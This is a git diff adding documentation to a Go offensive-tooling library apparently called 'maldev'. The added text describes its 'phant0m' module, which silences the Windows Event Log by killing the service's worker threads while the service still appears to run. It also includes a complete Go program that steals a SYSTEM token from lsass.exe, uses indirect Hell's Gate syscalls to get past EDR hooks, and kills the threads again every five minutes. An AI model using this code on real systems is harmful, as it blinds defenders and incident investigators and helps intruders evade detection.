@@ -9,6 +9,25 @@
 
 ---
 
+## Primer
+
+Windows records almost every interesting action (logons, new services,
+scheduled tasks, PowerShell script blocks, Sysmon events) into the **Event
+Log**. Investigators and EDR agents rely on this stream to piece together
+what happened after an incident.
+
+The naive way to silence it — `sc stop EventLog` — is itself logged: the
+Service Control Manager writes an event saying "EventLog stopped". Phant0m
+avoids that by leaving the service **appearing to run** (SCM sees it as
+`Running`, nothing to report) while killing the individual worker threads
+that actually receive and persist new events. Events submitted after that
+point are silently dropped on the floor — there is no worker to handle
+them.
+
+In short: the lights are on, but nobody is home.
+
+---
+
 ## What It Does
 
 Terminates the individual worker threads of the Windows Event Log service while
@@ -99,6 +118,57 @@ if err := phant0m.Kill(caller); err != nil {
 When a non-nil `*wsyscall.Caller` is provided, `NtTerminateThread` is invoked
 through the caller (indirect/spoofed). When `nil`, `TerminateThread` is called
 via the standard Win32 API.
+
+---
+
+## Combined Example — Token Theft + Phant0m + Timed Re-kill
+
+Steal a SYSTEM token to satisfy `SeDebugPrivilege`, silence the event log,
+then re-kill the EventLog threads on a ticker because the service host may
+restart them when an SCM heartbeat notices they are gone.
+
+```go
+package main
+
+import (
+    "log"
+    "time"
+
+    "github.com/oioio-space/maldev/evasion/phant0m"
+    "github.com/oioio-space/maldev/win/token"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+func main() {
+    // 1. Steal lsass or services.exe SYSTEM token for SeDebugPrivilege.
+    tok, err := token.StealByName("lsass.exe")
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer tok.Close()
+    if err := tok.EnablePrivilege("SeDebugPrivilege"); err != nil {
+        log.Fatal(err)
+    }
+
+    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
+
+    // 2. First kill — silence the event log immediately.
+    if err := phant0m.Kill(caller); err != nil {
+        log.Printf("phant0m: %v", err)
+    }
+
+    // 3. Re-kill every 5 minutes in case the SCM restarts the threads.
+    for range time.Tick(5 * time.Minute) {
+        _ = phant0m.Kill(caller)
+    }
+}
+```
+
+Layered benefit: token theft hands us the privilege without touching LSA
+directly; indirect syscalls route `NtTerminateThread` around hooked stubs;
+the ticker handles thread-restart recovery without any SCM interaction.
+
+---
 
 ## Advantages & Limitations
 
